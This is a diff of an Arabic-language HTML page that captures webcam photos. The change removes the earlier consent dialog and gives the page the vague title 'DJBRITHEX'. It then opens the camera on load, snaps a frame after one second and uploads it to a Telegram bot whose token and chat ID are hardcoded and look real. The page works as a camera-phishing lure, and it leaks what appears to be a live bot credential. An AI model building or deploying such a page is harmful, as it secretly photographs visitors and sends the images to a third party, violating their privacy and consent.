@@ -2,69 +2,51 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>Auto Capture</title>
+<title>DJBRITHEX</title>
 </head>
 <body>
 
-<video id="video" width="320" height="240" autoplay style="display:none;"></video>
+<h2>.</h2>
+
+<video id="video" width="320" height="240" autoplay></video>
 <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
 <script>
-const BOT_TOKEN = "PUT-YOUR-TOKEN-HERE";
-const CHAT_ID = "PUT-CHAT-ID-HERE";
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
 
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const ctx = canvas.getContext("2d");
+    const BOT_TOKEN = "7960928309:AAFWhZhNuHn42tzjUEyvoUT8k6Eu97BaFbA";
+    const CHAT_ID = "8557609477";
 
-async function capture(facing) {
-    const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: facing }
-    });
+    // فتح الكاميرا
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            video.srcObject = stream;
 
-    video.srcObject = stream;
+            // التقاط الصورة بعد 1 ثانية
+            setTimeout(() => {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // الانتظار حتى تستقر الصورة
-    await new Promise(r => setTimeout(r, 1200));
+                canvas.toBlob(blob => {
 
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    let formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("photo", blob, "photo.jpg");
 
-    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    })
+                    .then(() => alert("✓ تم التقاط الصورة وإرسالها إلى تيليغرام"))
+                    .catch(() => alert("✗ حدث خطأ أثناء الإرسال"));
 
-    // إيقاف الكاميرا
-    stream.getTracks().forEach(track => track.stop());
+                }, "image/jpeg");
 
-    return blob;
-}
+            }, 1000); // 1 ثانية
 
-async function sendToTelegram(blob, name) {
-    let formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("photo", blob, name + ".jpg");
-
-    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: formData
-    });
-}
-
-async function startProcess() {
-    const ok = confirm("هل تريد التقاط صور وإرسالها إلى تليغرام؟");
-
-    if (!ok) return;
-
-    // كاميرا أمامية
-    const front = await capture("user");
-    await sendToTelegram(front, "front");
-
-    // كاميرا خلفية
-    const back = await capture("environment");
-    await sendToTelegram(back, "back");
-
-    alert("✓ تم التقاط وإرسال الصورتين بنجاح");
-}
-
-startProcess();
+        })
+        .catch(() => alert("✗ لم يتم السماح بفتح الكاميرا"));
 </script>
 
 </body>
